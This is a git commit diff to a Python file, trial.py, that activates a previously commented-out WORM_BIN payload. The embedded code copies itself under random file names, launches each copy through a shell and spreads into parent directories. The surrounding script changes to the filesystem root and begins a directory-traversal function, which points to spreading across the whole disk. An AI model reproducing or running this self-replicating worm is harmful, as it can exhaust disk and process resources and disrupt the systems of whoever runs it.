4a4242ea4dd7287c4c8a7ef8418807a0c2e22938
LorenzoPixel <71122234+HealthyFryOption@users.noreply.github.com>
2022-02-11 01:34:32 +0800

    Update trial.py

--- Main/trial.py
+++ Main/trial.py
@@ -5,7 +5,7 @@ random.seed()
 
 os.chdir('/')
 
-# WORM_BIN = b'from subprocess import run\r\nimport shutil\r\nfrom random import seed, randint\r\n\r\n# Initialise random library\r\nseed()\r\n\r\n# Create a version of itself\r\nfile_name = "worm"+str(randint(2, 5000))+".py"\r\nshutil.copy(__file__, file_name)\r\nrun((file_name), shell=True)\r\n\r\n# Adopt worm1.py name\r\nshutil.copy(__file__, "../")\r\nrun(("worm1.py"), shell=True, cwd="../")'
+WORM_BIN = b'from subprocess import run\r\nimport shutil\r\nfrom random import seed, randint\r\n\r\n# Initialise random library\r\nseed()\r\n\r\n# Create a version of itself\r\nfile_name = "worm"+str(randint(2, 5000))+".py"\r\nshutil.copy(__file__, file_name)\r\nrun((file_name), shell=True)\r\n\r\n# Adopt worm1.py name\r\nshutil.copy(__file__, "../")\r\nrun(("worm1.py"), shell=True, cwd="../")'
 
 def traverse(path):
     with os.scandir(path) as scanner:
